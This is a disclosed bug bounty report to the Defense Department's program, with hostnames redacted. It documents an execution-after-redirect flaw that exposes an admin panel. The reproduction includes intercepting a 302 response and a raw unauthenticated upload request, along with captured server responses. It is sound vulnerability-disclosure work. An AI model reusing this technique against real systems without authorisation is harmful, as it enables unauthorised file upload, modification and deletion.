# Unauthenticated Access to Admin Panel Functions at https://███████/███

## Report Details
- **Report ID**: 1397564
- **URL**: https://hackerone.com/reports/1397564
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-11-10T14:56:36.571Z
- **Disclosed**: 2021-11-29T22:16:07.481Z

## Reporter
- **Username**: palaziv
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
The admin panel at https://██████████/████████ and all its functions can be accessed without authentication. This is basically the same vulnerability as in #1394910, just on another system.

## Impact

An attacker is able to use the administrative functions in order to upload, delete or modify files.

## System Host(s)
███

## Affected Product(s) and Version(s)
██████████

## CVE Numbers


## Steps to Reproduce
* Navigate to https://███/ and click on the "Authenticate ██████████" button
* Notice how the application first sends an HTTP POST request to https://███████/████████ which should redirect to https://██████/██████████ (`Location: █████`). Navigating to  https://███/██████ redirects to https://█████/███
* Looking at the response to https://█████/███ I noticed that even though the server sent back a 302 status code with a header `Location: /██████████` the response was quite long
* I browsed to https://█████████/████████, intercepted the response in Burp, changed the status code from `302 Found` to `200 OK` and was presented with the admin panel (this kind of attack is called [Execution after Redirect](https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR))). Below you can see the unmodified response containing links to the ██████ Admin Functions:

```
HTTP/1.1 302 Found
Date: Wed, 10 Nov 2021 14:28:15 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-store, no-cache, must-revalidate
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: /██████
Pragma: no-cache
Set-Cookie: █████████; path=/; HttpOnly
Set-Cookie: ███████; Path=/; HttpOnly; Secure
X-Vcap-Request-Id: 3c110e5d-196e-46f4-503d-222157e0c465
Strict-Transport-Security: max-age=31536000; includeSubDomains
██████████████████
Content-Length: 4266


<!-- Unused LIMDIS banner in WWW  

<table align="center" width="800" border="1" cellspacing="1"
	cellpadding="1" bgcolor="#008000">
	<tr>
		<td style="color: #FFF";  align="center">LIMITED DISTRIBUTION<br> <font
			size="2px">Distribution authorized to DoD, IAW 10 U.S.C. §§ 130 &
				455. Release authorized to U.S. DoD contractors, IAW 48 C.F.R. §
				252.245-7000. Refer other requests to: Headquarters, ██████████, ATTN:
				Release Of ficer, ███████, ██████,
				█████. Destroy IAW DoDI 5030.59. Removal of this caveat is
				prohibited.</font></td>
	</tr>
</table>
--><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang='en' xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Admin</title>
<script src="../███████/SpryAssets/SpryMenuBar.js" type="text/javascript"></script>
<link href="../█████/SpryAssets/SpryMenuBarHorizontal.css"
	rel="stylesheet" type="text/css" />
</head>

<body>
	<table align="center" bgcolor="50D6EE" border="3">
		<tr>
			<td colspan="2" align="center"><img
				src="../███████/images/███_banner_top.jpg" /></td>
		</tr>
		<tr>
			<td align="center"><br />
            Welcome to ███  You are on World Wide Web<br /></td>
		</tr>
		<tr>
			<td>
				<div align="center">
					<ul id="MenuBar1" class="MenuBarHorizontal">
						<li><a class="MenuBarItemSubmenu" href="#">Home</a></li>
						<li><a class="MenuBarItemSubmenu" href="#">█████ Admin Functions</a>
							<ul>
								<li><a href="s3html.php">UpLoad Weekly</a></li>
								<li><a href="../███/██████/verifyfile.php">Verify File Dates</a></li>
								<li><a href="#">Add Single File</a>
									<ul>
										<li><a href="../██████████/██████████/addnewfile.php" target="new">VDU ADD
										</a></li>
										<li><a href="../██████/██████████/addvpf.php" target="new">VPF ADD</a></li>
										<li><a href="../██████████/█████/█████class.php" target="new">Change
												Classification</a></li>
										<li><a href="../████████/██████/██████████bull.php">New ███</a></li>
										<li><a href="../██████████/█████████/███████loadgraph.php" target="new">Graphic
												ADD</a></li>
										<li><a href="../██████/████████/██████delgrp.php">Delete 'ALL' Graphic
												Files</a></li>
									</ul></li>
								<li><a href="#">Upload New Editions</a>
									<ul>
										<li><a href="../████████/█████/██████loadvdu.php" target="new">Install
												New Base VDU </a></li>
										<li><a href="../███/██████████/█████loadvpf.php" target="new">Install
												New base VPF </a></li>
										<li><a href="../█████████/██████████/███████loadtxt.php" target="new">Install/Update
												█████████##.txt</a></li>
										<li><a href="../███████/███████/███████newgraph.php" target="new">Replace
												all Graphic Files</a></li>
									</ul></li>
								<li><a href="#">Modify Single File**</a>
									<ul>
										<li><a href="../██████/█████████/██████mod.php">Modify ██████████ Chart</a></li>
										<li><a href="../██████████/███████/█████vitem.php">Modify Library Specific
												File</a></li>
										<li><a href="../████████/███/█████viteml.php">Stop ALL VPFS from
												being viewed from specific Region</a></li>
										<li><a href="../█████/███/█████████graphic.php">Modify Graphic
												Specific File</a></li>
									</ul></li>
								<li><a href="../███████/████/██████████vpfdel.php">DELETE VPF, VDU,
										Graphics</a></li>
								<li><a href="#">Change Status of Deleted and New Records</a>
									<ul>
										<li><a href="../████/█████/████████deldel.php">Change Record Status
												To an ADDed or DELeted VDU Record</a></li>
									</ul></li>
								<li><a href="../████/█████/█████_documentation.php">████
										Documentation</a></li>
							</ul></li>
						<li><a href="dssLogout.php">Logout</a></li>
					</ul>
				</div>
				<p>&nbsp;</p>
				<p>&nbsp;</p>
				<p>
					<br /> <br />
				</p>
			</td>
		</tr>
		<tr>
			<td><br /> <br /></td>
		</tr>
		<tr align="center">
		</tr>
	</table>
	<script type="text/javascript">
    var MenuBar1 = new Spry.Widget.MenuBar("MenuBar1", {imgDown:"../SpryAssets/SpryMenuBarDownHover.gif", imgRight:"../SpryAssets/SpryMenuBarRightHover.gif"});
</script>
</body>
</html>

```

* The functions allow to upload, modify and to delete █████ files and can all be used completely unauthenticated. Following an example in which I upload a file; this upload function can be accessed from https://█████/██████/████/█████████bull.php. Note that the request has no session cookie:

```
POST /████/███████/███████bulla.php HTTP/1.1
Host: █████
Content-Length: 401
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://█████
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVxWfTBx5ZkXMXVG2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: https://███████/█████/████/████████bull.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
X-Bug-Bounty: HackerOne-palaziv
X-Bug-Bounty: BurpSuitePro

------WebKitFormBoundaryVxWfTBx5ZkXMXVG2
Content-Disposition: form-data; name="bdate"

1970-01-01
------WebKitFormBoundaryVxWfTBx5ZkXMXVG2
Content-Disposition: form-data; name="userfile1"; filename="test.txt"
Content-Type: text/plain

test

------WebKitFormBoundaryVxWfTBx5ZkXMXVG2
Content-Disposition: form-data; name="buttonm"

Begin Uploads
------WebKitFormBoundaryVxWfTBx5ZkXMXVG2--
```

Response:

```
HTTP/1.1 302 Found
Date: Wed, 10 Nov 2021 14:44:57 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-store, no-cache, must-revalidate
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: ../../█████████/404.html
Pragma: no-cache
Set-Cookie: JSESSIONID=fceoa3cccho3q5dc6ahec3ghav; path=/; HttpOnly
Set-Cookie: ███; Path=/; HttpOnly; Secure
X-Vcap-Request-Id: ffb083d0-f29b-4623-5249-9f015b9cc59f
Strict-Transport-Security: max-age=31536000; includeSubDomains
Set-Cookie: TS01b8cd54=01dc86b24807c4064ee7333f073dd2db329d550bf5a80b061306a56af136c21560cefb7fa74dbd19a258797185afd48dfdfb9f2dca; Path=/; Domain=.█████████
Content-Length: 173

<br>Upload SUCCESS!<br>S3 ObjectURL: https://pcf-om-mil-86e7ccdd-b099-4b50-aad2-cad52466327b.s3.amazonaws.com/██████████/███████SiteContent/█████████████.zip<br>error in █████ table 
```

This uploaded file can be downloaded again on https://█████████.██████████/████/███/███.php (another system) by clicking on the "██████████ ███████" link: https://██████.█████████/█████████/██████████/downloadS3File.php?file=███%2F██████SiteContent%2F███████.zip

## Suggested Mitigation/Remediation Actions
Implement proper access controls.

Mitigation for the Execution after Redirect vulnerability: Proper termination should be performed after redirects. In a function a return should be performed. In other instances functions such as die() should be performed. This will tell the application to terminate regardless of if the page is redirected or not.



## Attachments
No attachments
